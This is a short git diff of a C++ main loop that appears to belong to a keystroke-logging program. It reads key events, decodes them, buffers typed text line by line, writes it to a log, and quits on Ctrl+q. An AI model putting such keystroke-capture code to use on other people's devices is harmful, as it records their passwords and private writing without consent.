@@ -1,7 +1,7 @@
 
 #include <iostream>
 
-#include "KeyDecoder.hpp"
+#include "include/KeyDecoder.hpp"
 #include "KeyListener.hpp"
 #include "Logger.hpp"
 
@@ -14,16 +14,34 @@ int main()
         KeyListener listener;
         KeyDecoder decoder;
         Logger logger;
-        //How to leave while loop?
+        std::string str;
         while (true)
         {
             KeyEvent ev = listener.Listen();
-            std::string str = decoder.Decode(ev);
-            if (str == "Ctrl")
+            if (ev.code == 0 && ev.value == 0)
+            {
+                continue;
+            }
+            std::string temp = decoder.Decode(ev);
+            if (temp.contains("["))
+            {
+                logger.Log(temp);
+                continue;
+            }
+            str += temp;
+            if (str == "Ctrl+q")
             {
                 break;
             }
-            logger.Log(str);
+            else if (str.empty())
+            {
+                continue;
+            }
+            else if (str.contains("\n"))
+            {
+                logger.Log(str.substr(0, str.size() - 2));
+                str.clear();
+            }
         }
     }
     catch (const std::exception &e)
